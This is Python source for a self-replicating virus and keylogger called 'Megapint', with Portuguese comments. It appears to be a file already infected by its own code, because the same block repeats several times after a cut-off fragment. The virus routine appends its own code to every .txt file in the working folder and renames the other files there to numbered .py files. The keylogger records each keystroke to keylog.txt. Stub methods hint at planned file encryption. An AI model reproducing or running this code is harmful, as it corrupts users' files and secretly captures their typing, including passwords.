            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
